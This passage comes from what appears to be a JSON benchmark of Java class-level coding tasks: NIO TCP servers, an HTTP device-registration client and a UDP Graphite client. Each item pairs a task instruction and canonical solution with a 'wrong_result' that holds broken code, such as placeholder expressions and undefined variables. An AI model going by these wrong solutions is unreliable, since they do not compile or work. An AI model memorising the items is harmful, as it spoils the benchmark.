toJson(CreateDeviceDto dto) {\n\t\ttry {\n\t\t\treturn JSON.writer().writeValueAsString(dto);\n\t\t} catch (JacksonException e) {\n\t\t\tthrow new IllegalStateException(\"Failed to serialize DTO\", e);\n\t\t}\n\t}\n\n\tprivate HttpResponse<Void> handleResponse(HttpResponse<Void> voidHttpResponse) {\n\t\tassert EXPECTED_RESPONSE_CODES.contains(voidHttpResponse.statusCode());\n\t\treturn voidHttpResponse;\n\t}\n\n\tprivate void registrationFailed(Throwable cause) {\n\t\tresult.completeExceptionally(cause);\n\t}\n\n\tprivate static class CreateDeviceDto {\n\t\tpublic String id;\n\t\tpublic String name;\n\t\tpublic final String type = \"DESKTOP\";\n\t\tpublic String publicKey;\n\t}\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 17,
    "wrong_result": "public class HubHttpClient {\n    private static final ObjectMapper JSON = new ObjectMapper();\n    private static final List<Integer> EXPECTED_RESPONSE_CODES = List.of(200, 201);\n    private final HubConfig hubConfig;\n    private final String bearerToken;\n    private final String deviceId;\n    private final P384KeyPair keyPair;\n    private final CompletableFuture<ReceivedKey> result;\n    private final HttpClient httpClient;\n\n    public HubHttpClient(ExecutorService executor, HubConfig hubConfig, String deviceId, DeviceKey deviceKey, CompletableFuture<ReceivedKey> result, AtomicReference<String> bearerToken) {\n        this.hubConfig = hubConfig;\n        this.bearerToken = bearerToken.get();\n        this.deviceId = deviceId;\n        this.keyPair = deviceKey;\n        this.result = result;\n        this.httpClient = HttpClient.newBuilder()\n                .executor(executor)\n                .version(HttpClient.Version.HTTP_2)\n                .build();\n    }\n\n    public void registerDevice(String deviceName) {\n        CreateDeviceDto dto = new CreateDeviceDto(\n                deviceId,\n                deviceName,\n                \"DESKTOP\",\n                Base64.getEncoder().encodeToString(keyPair.getPublicKey().getEncoded())\n        );\n        \n        String json = toJson(dto);\n        \n        HttpRequest request = HttpRequest.newBuilder()\n                .uri(URI.create(hubConfig.getBaseUrl() + \"/api/v1/device/register\"))\n                .header(\"Authorization\", \"Bearer \" + bearerToken)\n                .header(\"Content-Type\", \"application/json\")\n                .POST(HttpRequest.BodyPublishers.ofString(json))\n                .build();\n\n        httpClient.sendAsync(request, HttpResponse.BodyHandlers.ofString())\n                .thenApply(HttpResponse::body)\n                .thenApply(this::handleResponse)\n                .exceptionally(throwable -> {\n                    registrationFailed(throwable);\n                    return null;\n                });\n    }\n\n    private String toJson(CreateDeviceDto dto) {\n        try {\n            return JSON.writeValueAsString(dto);\n        } catch (JsonProcessingException e) {\n            throw new RuntimeException(\"Failed to serialize device registration data\", e);\n        }\n    }\n\n    private HttpResponse<Void> handleResponse(String responseBody) {\n        HttpResponse<Void> response = HttpResponse.builder()\n                .statusCode(200)\n                .body((Void) null)\n                .build();\n        \n        try {\n            ReceivedKey receivedKey = JSON.readValue(responseBody, ReceivedKey.class);\n            result.complete(receivedKey);\n        } catch (JsonProcessingException e) {\n            registrationFailed(new RuntimeException(\"Failed to parse received key\", e));\n        }\n        \n        return response;\n    }\n\n    private void registrationFailed(Throwable throwable) {\n        result.completeExceptionally(throwable);\n    }\n\n    public static class CreateDeviceDto {\n        private String id;\n        private String name;\n        private String type;\n        private String publicKey;\n\n        public CreateDeviceDto(String id, String name, String type, String publicKey) {\n            this.id = id;\n            this.name = name;\n            this.type = type;\n            this.publicKey = publicKey;\n        }\n\n        // Getters\n        public String getId() { return id; }\n        public String getName() { return name; }\n        public String getType() { return type; }\n        public String getPublicKey() { return publicKey; }\n    }\n}"
  },
  {
    "Task_id": 440,
    "Instruction": "Task Description: Implement a Java NIO-based TCP server that handles multiple client connections asynchronously, processes incoming data, and sends responses back to clients.\n\nClass Description: The Server class implements a Component interface and provides non-blocking TCP server functionality using Java NIO channels and selectors. It manages client connections, reads incoming data in a length-prefixed format, processes commands, and writes responses back to clients.\n\nAttributes:\n- SERVER_PORT: [int] - The port number on which the server listens for incoming connections\n- conMan: [NIOConnectionManager] - Manages NIO connections and selection operations\n- acceptor: [ServerSocketChannel] - The main server socket channel that accepts incoming connections\n- dhts: [Collection<DHT>] - Collection of DHT instances used for command processing\n\nMethods:\n- start([Collection<DHT> dhts, ConfigReader config]) -> [void] - Initializes the server by creating a non-blocking ServerSocketChannel, binding it to the specified port, and registering it with the connection manager\n- stop() -> [void] - Stops the server by closing the ServerSocketChannel and releasing resources\n- accept() -> [void] - Accepts new client connections, configures them as non-blocking, and registers them with the connection manager for read/write operations\n- read() -> [void] - Reads data from a client channel in a length-prefixed format (4-byte header followed by payload)\n- process([ByteBuffer buf]) -> [void] - Processes the received data buffer by decoding it and executing the appropriate command\n- write() -> [void] - Writes response data back to the client channel\n- calcInterestOps() -> [int] - Calculates the current interest operations (OP_READ/OP_WRITE) for the selection key\n- selectionEvent([SelectionKey key]) -> [void] - Handles selection events (readable/writable) for client channels\n- registrationEvent([NIOConnectionManager manager, SelectionKey key]) -> [void] - Handles registration events with the connection manager\n- getChannel() -> [SelectableChannel] - Returns the associated channel (either server or client channel)\n- doStateChecks([long now]) -> [void] - Performs periodic state checks (currently empty implementation)",
    "Canonical_solution": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.InetSocketAddress;\nimport java.net.StandardSocketOptions;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SelectableChannel;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.ServerSocketChannel;\nimport java.nio.channels.SocketChannel;\nimport java.nio.charset.StandardCharsets;\nimport java.nio.file.Paths;\nimport java.util.Collection;\nimport java.util.Deque;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.concurrent.ConcurrentLinkedDeque;\n\nimport lbms.plugins.mldht.kad.DHT;\nimport lbms.plugins.mldht.utils.NIOConnectionManager;\nimport lbms.plugins.mldht.utils.Selectable;\nimport the8472.bencode.BDecoder;\nimport the8472.mldht.Component;\nimport the8472.utils.ConfigReader;\n\npublic class Server implements Component {\n\t\n\tpublic static int SERVER_PORT = 33348;\n\t\n\tNIOConnectionManager conMan = new NIOConnectionManager(\"CLI-server\");\n\tServerSocketChannel acceptor;\n\tCollection<DHT> dhts;\n\t\n\t@Override\n\tpublic void start(Collection<DHT> dhts, ConfigReader config) {\n\t\tthis.dhts = dhts;\n\t\t\n\t\ttry {\n\t\t\tacceptor = ServerSocketChannel.open();\n\t\t\tacceptor.configureBlocking(false);\n\t\t\tacceptor.setOption(StandardSocketOptions.SO_REUSEADDR, true);\n\t\t\tacceptor.bind(new InetSocketAddress(InetAddress.getLoopbackAddress(), SERVER_PORT));\n\t\t\t\n\t\t\tconMan.register(new Selectable() {\n\t\t\t\t\n\t\t\t\t@Override\n\t\t\t\tpublic void selectionEvent(SelectionKey key) throws IOException {\n\t\t\t\t\tif(key.isAcceptable())\n\t\t\t\t\t\taccept();\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\t@Override\n\t\t\t\tpublic void registrationEvent(NIOConnectionManager manager, SelectionKey key) throws IOException {}\n\t\t\t\t\n\t\t\t\t@Override\n\t\t\t\tpublic SelectableChannel getChannel() {\n\t\t\t\t\treturn acceptor;\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\t@Override\n\t\t\t\tpublic void doStateChecks(long now) throws IOException {}\n\t\t\t\t\n\t\t\t\t@Override\n\t\t\t\tpublic int calcInterestOps() {\n\t\t\t\t\treturn SelectionKey.OP_ACCEPT;\n\t\t\t\t}\n\t\t\t});\n\t\t\t\n\t\t} catch (IOException e) {\n\t\t\te.printStackTrace();\n\t\t}\n\t}\n\t\n\tvoid accept() {\n\t\ttry {\n\t\t\tSocketChannel chan = acceptor.accept();\n\t\t\tchan.configureBlocking(false);\n\t\t\tchan.socket().setSoTimeout(0);\n\t\t\tchan.setOption(StandardSocketOptions.SO_KEEPALIVE, true);\n\t\t\t\n\t\t\tconMan.register(new Selectable() {\n\t\t\t\t\n\t\t\t\tByteBuffer header = ByteBuffer.allocate(4);\n\t\t\t\tByteBuffer payload = null;\n\t\t\t\tByteBuffer currentReadTarget = header;\n\t\t\t\tDeque<ByteBuffer> writes = new ConcurrentLinkedDeque<>();\n\t\t\t\t\n\t\t\t\t@Override\n\t\t\t\tpublic void selectionEvent(SelectionKey key) throws IOException {\n\t\t\t\t\tif(!chan.isOpen()) {\n\t\t\t\t\t\tconMan.deRegister(this);\n\t\t\t\t\t\treturn;\n\t\t\t\t\t}\n\t\t\t\t\tif(key.isValid() && key.isReadable())\n\t\t\t\t\t\tread();\n\t\t\t\t\tif(key.isValid() && key.isWritable())\n\t\t\t\t\t\twrite();\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\tvoid read() throws IOException {\n\t\t\t\t\ttry {\n\t\t\t\t\t\tint read = chan.read(currentReadTarget);\n\t\t\t\t\t\t\n\t\t\t\t\t\tif(read == -1) {\n\t\t\t\t\t\t\theader = null;\n\t\t\t\t\t\t\tconMan.interestOpsChanged(this);\n\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\n\t\t\t\t\t\tif(currentReadTarget.remaining() == 0) {\n\t\t\t\t\t\t\tcurrentReadTarget.flip();\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\tif(currentReadTarget == header) {\n\t\t\t\t\t\t\t\tpayload = ByteBuffer.allocate(header.getInt(0));\n\t\t\t\t\t\t\t\tcurrentReadTarget = payload;\n\t\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\t\tprocess(payload);\n\t\t\t\t\t\t\t\tpayload = null;\n\t\t\t\t\t\t\t\theader.clear();\n\t\t\t\t\t\t\t\tcurrentReadTarget = header;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t} catch (IOException e) {\n\t\t\t\t\t\tchan.close();\n\t\t\t\t\t}\t\t\t\t\t\t\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\tvoid process(ByteBuffer buf) {\n\t\t\t\t\tBDecoder decoder = new BDecoder();\n\t\t\t\t\tMap<String, Object> map = decoder.decode(buf);\n\t\t\t\t\tList<byte[]> args = (List<byte[]>) map.get(\"arguments\");\n\t\t\t\t\tCommandProcessor processor = CommandProcessor.from(args, (b) -> {\n\t\t\t\t\t\tByteBuffer h = ByteBuffer.allocate(4);\n\t\t\t\t\t\th.putInt(0, b.remaining());\n\t\t\t\t\t\tsynchronized (writes) {\n\t\t\t\t\t\t\twrites.add(h);\n\t\t\t\t\t\t\twrites.add(b);\n\t\t\t\t\t\t}\n\t\t\t\t\t\tconMan.interestOpsChanged(this);\n\t\t\t\t\t}, dhts);\n\t\t\t\t\tprocessor.currentWorkDir = Paths.get(new String((byte[])map.get(\"cwd\"), StandardCharsets.UTF_8));\n\t\t\t\t\tprocessor.active = chan::isOpen;\n\t\t\t\t\ttry {\n\t\t\t\t\t\tprocessor.process();\n\t\t\t\t\t} catch(Exception e) {\n\t\t\t\t\t\tprocessor.handleException(e);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\tvoid write() throws IOException {\n\t\t\t\t\ttry {\n\t\t\t\t\t\twhile (!writes.isEmpty()) {\n\t\t\t\t\t\t\tif (!writes.peekFirst().hasRemaining()) {\n\t\t\t\t\t\t\t\twrites.removeFirst();\n\t\t\t\t\t\t\t\tcontinue;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tlong written = chan.write(writes.stream().toArray(ByteBuffer[]::new));\n\t\t\t\t\t\t\tif (written == 0)\n\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t}\n\t\t\t\t\t} catch (IOException e) {\n\t\t\t\t\t\tchan.close();\n\t\t\t\t\t\treturn;\n\t\t\t\t\t}\n\n\t\t\t\t\tif(writes.isEmpty())\n\t\t\t\t\t\tconMan.interestOpsChanged(this);\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\t@Override\n\t\t\t\tpublic void registrationEvent(NIOConnectionManager manager, SelectionKey key) throws IOException {}\n\t\t\t\t\n\t\t\t\t@Override\n\t\t\t\tpublic SelectableChannel getChannel() {\n\t\t\t\t\treturn chan;\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\t@Override\n\t\t\t\tpublic void doStateChecks(long now) throws IOException {}\n\t\t\t\t\n\t\t\t\t@Override\n\t\t\t\tpublic int calcInterestOps() {\n\t\t\t\t\tint ops = 0;\n\t\t\t\t\tif(header != null)\n\t\t\t\t\t\tops = SelectionKey.OP_READ;\n\t\t\t\t\tif(writes.peek() != null)\n\t\t\t\t\t\tops |= SelectionKey.OP_WRITE;\n\t\t\t\t\treturn ops;\n\t\t\t\t}\n\t\t\t});\n\t\t\t\n\t\t} catch (IOException e) {\n\t\t\te.printStackTrace();\n\t\t}\n\t}\n\t\n\t@Override\n\tpublic void stop() {\n\t\ttry {\n\t\t\tacceptor.close();\n\t\t} catch (IOException e) {\n\t\t\te.printStackTrace();\n\t\t}\n\t}\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 7,
    "wrong_result": "public class Server implements Component {\n    private int SERVER_PORT;\n    private NIOConnectionManager conMan;\n    private ServerSocketChannel acceptor;\n    private Collection<DHT> dhts;\n\n    public void start(Collection<DHT> dhts, ConfigReader config) {\n        this.dhts = dhts;\n        this.SERVER_PORT = config.getServerPort();\n        try {\n            acceptor = ServerSocketChannel.open();\n            acceptor.configureBlocking(false);\n            acceptor.socket().bind(new InetSocketAddress(SERVER_PORT));\n            conMan = new NIOConnectionManager();\n            conMan.register(acceptor, SelectionKey.OP_ACCEPT);\n            accept();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void stop() {\n        try {\n            if (acceptor != null) {\n                acceptor.close();\n            }\n            if (conMan != null) {\n                conMan.stop();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void accept() {\n        while (true) {\n            ServerSocketChannel serverChannel = (ServerSocketChannel) getChannel();\n            if (serverChannel == null) break;\n            SocketChannel clientChannel = serverChannel.accept();\n            if (clientChannel != null) {\n                clientChannel.configureBlocking(false);\n                conMan.register(clientChannel, SelectionKey.OP_READ | SelectionKey.OP_WRITE);\n            }\n        }\n    }\n\n    private void read() {\n        ByteBuffer header = ByteBuffer.allocate(4);\n        int bytesRead = 0;\n        while (bytesRead < 4) {\n            bytesRead += channel.read(header);\n            if (bytesRead == 0) {\n                break;\n            }\n        }\n        if (bytesRead == 4) {\n            header.flip();\n            int payloadLength = header.getInt();\n            ByteBuffer payload = ByteBuffer.allocate(payloadLength);\n            bytesRead = 0;\n            while (bytesRead < payloadLength) {\n                bytesRead += channel.read(payload);\n                if (bytesRead == 0) {\n                    break;\n                }\n            }\n            if (bytesRead == payloadLength) {\n                payload.flip();\n                process(payload);\n            }\n        }\n    }\n\n    private void process(ByteBuffer buf) {\n        int commandId = buf.getInt();\n        byte[] data = new byte[buf.remaining()];\n        buf.get(data);\n        // Execute command using DHTs\n        // For example:\n        // DHT dht = dhts.iterator().next();\n        // dht.process(commandId, data);\n        // Prepare response\n        // ByteBuffer response = ...;\n        // write(response);\n    }\n\n    private void write() {\n        ByteBuffer response = ...; // Assume response is prepared\n        while (response.hasRemaining()) {\n            channel.write(response);\n        }\n    }\n\n    private int calcInterestOps() {\n        int interestOps = 0;\n        if (hasDataToRead()) {\n            interestOps |= SelectionKey.OP_READ;\n        }\n        if (isWritable()) {\n            interestOps |= SelectionKey.OP_WRITE;\n        }\n        return interestOps;\n    }\n\n    private void selectionEvent(SelectionKey key) {\n        if (key.isAcceptable()) {\n            accept();\n        } else if (key.isReadable()) {\n            read();\n        } else if (key.isWritable()) {\n            write();\n        }\n    }\n\n    private void registrationEvent(NIOConnectionManager manager, SelectionKey key) {\n        // Handle registration events\n    }\n\n    public SelectableChannel getChannel() {\n        return (SelectableChannel) key.channel();\n    }\n\n    private void doStateChecks(long now) {\n        // Empty implementation\n    }\n}"
  },
  {
    "Task_id": 442,
    "Instruction": "Task Description: Implement a Java NIO-based TCP server that handles multiple client connections asynchronously, processes incoming data packets with checksum verification, and manages resources efficiently.\n\nClass Description: NIOServer - A non-blocking TCP server implementation using Java NIO that handles multiple client connections through a single selector thread.\n\nAttributes:\n- serverChannel: ServerSocketChannel - The main server channel that listens for incoming connections\n- selector: Selector - The multiplexor that manages multiple client connections\n\nMethods:\n- start(int port) -> void - Starts the server on the specified port and begins accepting connections\n  - Input: port (int) - The port number to bind the server to\n  - Output: None (throws Exception if startup fails)\n  \n- stop() -> void - Shuts down the server and releases all resources\n  - Input: None\n  - Output: None (handles exceptions internally)\n  \n- handleAccept(SelectionKey key) -> void - Handles new client connection acceptance\n  - Input: key (SelectionKey) - The selection key representing the accept event\n  - Output: None (throws Exception if connection acceptance fails)\n  \n- handleRead(SelectionKey key) -> void - Handles incoming data from clients with checksum verification\n  - Input: key (SelectionKey) - The selection key representing the read event\n  - Output: None (handles exceptions internally)\n  \n- isFull(ByteBuffer buffer) -> boolean - Helper method to check if a buffer is full\n  - Input: buffer (ByteBuffer) - The buffer to check\n  - Output: boolean - True if buffer is full, false otherwise",
    "Canonical_solution": "import java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.ServerSocketChannel;\nimport java.nio.channels.SocketChannel;\nimport java.util.Iterator;\nimport java.util.zip.Adler32;\nimport java.util.zip.Checksum;\n\npublic class NIOServer {\n    private ServerSocketChannel serverChannel;\n    private Selector selector;\n\n    public void start(int port) throws Exception {\n        serverChannel = ServerSocketChannel.open();\n        serverChannel.configureBlocking(false);\n        serverChannel.socket().setReuseAddress(true);\n        serverChannel.socket().bind(new InetSocketAddress(port));\n        \n        selector = Selector.open();\n        serverChannel.register(selector, SelectionKey.OP_ACCEPT);\n        \n        while (selector.isOpen()) {\n            if (selector.select(3000) == 0) {\n                continue;\n            }\n            \n            Iterator<SelectionKey> it = selector.selectedKeys().iterator();\n            while (it.hasNext()) {\n                SelectionKey key = it.next();\n                it.remove();\n                \n                if (!key.isValid()) {\n                    continue;\n                }\n                \n                if (key.isAcceptable()) {\n                    handleAccept(key);\n                } else if (key.isReadable()) {\n                    handleRead(key);\n                }\n            }\n        }\n    }\n\n    private void handleAccept(SelectionKey key) throws Exception {\n        SocketChannel socketChannel = ((ServerSocketChannel) key.channel()).accept();\n        socketChannel.configureBlocking(false);\n        socketChannel.register(key.selector(), SelectionKey.OP_READ);\n    }\n\n    private void handleRead(SelectionKey key) {\n        SocketChannel channel = (SocketChannel) key.channel();\n        try {\n            ByteBuffer head = ByteBuffer.allocate(4);\n            while (!isFull(head)) {\n                if (channel.read(head) == -1) {\n                    throw new RuntimeException(\"EOF error\");\n                }\n            }\n            head.flip();\n            int dataSize = head.getInt();\n            \n            ByteBuffer body = ByteBuffer.allocate(dataSize);\n            while (!isFull(body)) {\n                if (channel.read(body) == -1) {\n                    throw new RuntimeException(\"EOF error\");\n                }\n            }\n            \n            ByteBuffer tail = ByteBuffer.allocate(8);\n            while (!isFull(tail)) {\n                if (channel.read(tail) == -1) {\n                    break;\n                }\n            }\n            tail.flip();\n            \n            Checksum checksum = new Adler32();\n            checksum.update(body.array(), 0, dataSize);\n            if (tail.getLong() != checksum.getValue()) {\n                throw new RuntimeException(\"Data corrupted\");\n            }\n            \n            body.flip();\n            // Process packet here\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            try {\n                channel.close();\n            } catch (Exception ex) {\n                ex.printStackTrace();\n            }\n        }\n    }\n\n    private boolean isFull(ByteBuffer buffer) {\n        return buffer.position() == buffer.capacity();\n    }\n\n    public void stop() {\n        try {\n            if (selector != null) {\n                selector.close();\n            }\n            if (serverChannel != null) {\n                serverChannel.close();\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 7,
    "wrong_result": "public class NIOServer {\n    private ServerSocketChannel serverChannel;\n    private Selector selector;\n    private Map<SocketChannel, ByteBuffer> clientBuffers = new HashMap<>();\n\n    public void start(int port) throws IOException {\n        serverChannel = ServerSocketChannel.open();\n        serverChannel.configureBlocking(false);\n        serverChannel.socket().bind(new InetSocketAddress(port));\n        selector = Selector.open();\n        serverChannel.register(selector, SelectionKey.OP_ACCEPT);\n    }\n\n    public void stop() {\n        try {\n            if (selector != null) {\n                selector.close();\n            }\n            if (serverChannel != null) {\n                serverChannel.close();\n            }\n            for (SocketChannel client : clientBuffers.keySet()) {\n                client.close();\n            }\n            clientBuffers.clear();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void handleAccept(SelectionKey key) throws IOException {\n        ServerSocketChannel serverChannel = (ServerSocketChannel) key.channel();\n        SocketChannel clientChannel = serverChannel.accept();\n        clientChannel.configureBlocking(false);\n        ByteBuffer buffer = ByteBuffer.allocate(1024);\n        clientBuffers.put(clientChannel, buffer);\n        clientChannel.register(selector, SelectionKey.OP_READ);\n    }\n\n    public void handleRead(SelectionKey key) {\n        try {\n            SocketChannel clientChannel = (SocketChannel) key.channel();\n            ByteBuffer buffer = clientBuffers.get(clientChannel);\n            int bytesRead = clientChannel.read(buffer);\n            if (bytesRead == -1) {\n                clientChannel.close();\n                clientBuffers.remove(clientChannel);\n                key.cancel();\n                return;\n            }\n            if (isFull(buffer)) {\n                int length = buffer.getInt(0);\n                byte[] data = new byte[length];\n                buffer.get(data, 0, length);\n                int checksum = buffer.getInt(length);\n                int computedChecksum = computeChecksum(data);\n                if (computedChecksum == checksum) {\n                    System.out.println(\"Valid packet received: \" + new String(data));\n                } else {\n                    System.out.println(\"Invalid checksum\");\n                }\n                buffer.clear();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private boolean isFull(ByteBuffer buffer) {\n        return buffer.remaining() == 0;\n    }\n\n    private int computeChecksum(byte[] data) {\n        int checksum = 0;\n        for (byte b : data) {\n            checksum += b & 0xFF;\n        }\n        return checksum;\n    }\n}"
  },
  {
    "Task_id": 443,
    "Instruction": "Task Description: Create a Java class that implements a non-blocking TCP server using Java NIO (New I/O) to handle multiple client connections efficiently. The server should accept incoming connections, assign them to processors in a round-robin fashion, and manage connection lifecycle.\n\nClass Description: NIOAcceptor is a thread-based TCP server that uses Java NIO's Selector pattern to handle multiple client connections asynchronously. It creates a ServerSocketChannel, binds it to a specified port, and processes incoming connections by distributing them among available NIOProcessor instances.\n\nAttributes:\nport: [int] - The port number on which the server listens for incoming connections\nselector: [Selector] - The NIO selector used to monitor connection events\nserverChannel: [ServerSocketChannel] - The server socket channel that accepts client connections\nfactory: [FrontendConnectionFactory] - Factory for creating FrontendConnection objects\nprocessors: [NIOProcessor[]] - Array of processors for handling client connections\nnextProcessor: [int] - Index of the next processor to be used (round-robin assignment)\nacceptCount: [long] - Counter for accepted connections\n\nMethods:\nrun: [run()] -> [void] - Main thread loop that continuously checks for incoming connections using the selector\naccept: [accept()] -> [void] - Accepts a new client connection, configures it as non-blocking, and assigns it to a processor\nnextProcessor: [nextProcessor()] -> [NIOProcessor] - Returns the next available processor in round-robin fashion\ncloseChannel: [closeChannel(SocketChannel)] -> [void] - Closes the specified socket channel safely\n\nNested Class:\nAcceptIdGenerator: [static class] - Generates unique IDs for accepted connections with thread-safe increment operation\n  - acceptId: [long] - Current ID value\n  - lock: [Object] - Synchronization object\n  - getId: [getId()] -> [long] - Returns and increments the connection ID safely",
    "Canonical_solution": "import java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.ServerSocketChannel;\nimport java.nio.channels.SocketChannel;\nimport java.util.Set;\n\nimport org.apache.log4j.Logger;\n\npublic final class NIOAcceptor extends Thread {\n    private static final Logger LOGGER = Logger.getLogger(NIOAcceptor.class);\n    private static final AcceptIdGenerator ID_GENERATOR = new AcceptIdGenerator();\n\n    private final int port;\n    private final Selector selector;\n    private final ServerSocketChannel serverChannel;\n    private final FrontendConnectionFactory factory;\n    private NIOProcessor[] processors;\n    private int nextProcessor;\n    private long acceptCount;\n\n    public NIOAcceptor(String name, int port, FrontendConnectionFactory factory) throws IOException {\n        super.setName(name);\n        this.port = port;\n        this.selector = Selector.open();\n        this.serverChannel = ServerSocketChannel.open();\n        this.serverChannel.socket().bind(new InetSocketAddress(port));\n        this.serverChannel.configureBlocking(false);\n        this.serverChannel.register(selector, SelectionKey.OP_ACCEPT);\n        this.factory = factory;\n    }\n\n    @Override\n    public void run() {\n        final Selector selector = this.selector;\n        for (;;) {\n            ++acceptCount;\n            try {\n                selector.select(1000L);\n                Set<SelectionKey> keys = selector.selectedKeys();\n                try {\n                    for (SelectionKey key : keys) {\n                        if (key.isValid() && key.isAcceptable()) {\n                            accept();\n                        } else {\n                            key.cancel();\n                        }\n                    }\n                } finally {\n                    keys.clear();\n                }\n            } catch (Throwable e) {\n                LOGGER.warn(getName(), e);\n            }\n        }\n    }\n\n    private void accept() {\n        SocketChannel channel = null;\n        try {\n            channel = serverChannel.accept();\n            channel.configureBlocking(false);\n            FrontendConnection c = factory.make(channel);\n            c.setAccepted(true);\n            c.setId(ID_GENERATOR.getId());\n            NIOProcessor processor = nextProcessor();\n            c.setProcessor(processor);\n            processor.postRegister(c);\n        } catch (Throwable e) {\n            closeChannel(channel);\n            LOGGER.warn(getName(), e);\n        }\n    }\n\n    private NIOProcessor nextProcessor() {\n        if (++nextProcessor == processors.length) {\n            nextProcessor = 0;\n        }\n        return processors[nextProcessor];\n    }\n\n    private static void closeChannel(SocketChannel channel) {\n        if (channel == null) {\n            return;\n        }\n        try {\n            channel.close();\n        } catch (IOException e) {\n        }\n    }\n\n    private static class AcceptIdGenerator {\n        private static final long MAX_VALUE = 0xffffffffL;\n        private long acceptId = 0L;\n        private final Object lock = new Object();\n\n        private long getId() {\n            synchronized (lock) {\n                if (acceptId >= MAX_VALUE) {\n                    acceptId = 0L;\n                }\n                return ++acceptId;\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 7,
    "wrong_result": "import java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.ServerSocketChannel;\nimport java.nio.channels.SocketChannel;\nimport java.util.Iterator;\n\npublic class NIOAcceptor {\n    private final int port;\n    private final Selector selector;\n    private final ServerSocketChannel serverChannel;\n    private final FrontendConnectionFactory factory;\n    private final NIOProcessor[] processors;\n    private int nextProcessor;\n    private long acceptCount;\n    private static final AcceptIdGenerator acceptIdGenerator = new AcceptIdGenerator();\n\n    public NIOAcceptor(int port, NIOProcessor[] processors, FrontendConnectionFactory factory) throws IOException {\n        this.port = port;\n        this.processors = processors;\n        this.factory = factory;\n        this.selector = Selector.open();\n        this.serverChannel = ServerSocketChannel.open();\n        this.serverChannel.socket().bind(new InetSocketAddress(port));\n        this.serverChannel.configureBlocking(false);\n        this.serverChannel.register(selector, SelectionKey.OP_ACCEPT);\n    }\n\n    public void run() {\n        while (true) {\n            try {\n                selector.select();\n                Iterator<SelectionKey> keys = selector.selectedKeys().iterator();\n                while (keys.hasNext()) {\n                    SelectionKey key = keys.next();\n                    if (key.isAcceptable()) {\n                        accept();\n                    }\n                    keys.remove();\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n                break;\n            }\n        }\n    }\n\n    private void accept() throws IOException {\n        SocketChannel clientChannel = serverChannel.accept();\n        if (clientChannel != null) {\n            clientChannel.configureBlocking(false);\n            SelectionKey key = clientChannel.register(selector, SelectionKey.OP_READ);\n            FrontendConnection connection = factory.create();\n            NIOProcessor processor = nextProcessor();\n            processor.process(connection, key);\n            acceptCount++;\n        }\n    }\n\n    private NIOProcessor nextProcessor() {\n        return processors[nextProcessor++ % processors.length];\n    }\n\n    private void closeChannel(SocketChannel channel) {\n        if (channel != null && channel.isOpen()) {\n            try {\n                channel.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    static class AcceptIdGenerator {\n        private long acceptId;\n        private final Object lock = new Object();\n        public long getId() {\n            synchronized (lock) {\n                return acceptId++;\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 444,
    "Instruction": "Task Description: Create a Java class that implements UDP-based communication for sending metrics to a Graphite server using Java NIO's non-blocking DatagramChannel.\n\nClass Description: The GraphiteUDP class provides functionality to connect to a Graphite server via UDP, send metric data in the correct format, and handle connection management. It implements non-blocking UDP communication using Java NIO's DatagramChannel and includes error tracking and resource cleanup.\n\nAttributes:\n- hostname: [String] - The hostname of the Graphite server\n- port: [int] - The port number of the Graphite server\n- address: [InetSocketAddress] - The resolved socket address of the Graphite server\n- datagramChannel: [DatagramChannel] - The NIO channel used for UDP communication\n- failures: [int] - Counter for tracking failed send attempts\n\nMethods:\n- connect(): [void] -> [void] - Establishes a connection to the Graphite server by opening a DatagramChannel\n- isConnected(): [void] -> [boolean] - Checks if the connection to the Graphite server is active\n- send(): [String name, String value, long timestamp] -> [void] - Formats and sends a metric to the Graphite server\n- getFailures(): [void] -> [int] - Returns the count of failed send attempts\n- flush(): [void] -> [void] - Placeholder method (no action needed for UDP)\n- close(): [void] -> [void] - Closes the DatagramChannel and cleans up resources\n- sanitize(): [String s] -> [String] - Sanitizes metric names and values (delegates to GraphiteSanitize)\n- getDatagramChannel(): [void] -> [DatagramChannel] - Returns the current DatagramChannel instance\n- setDatagramChannel(): [DatagramChannel datagramChannel] -> [void] - Sets the DatagramChannel instance\n- getAddress(): [void] -> [InetSocketAddress] - Returns the current target address\n- setAddress(): [InetSocketAddress address] -> [void] - Sets the target address",
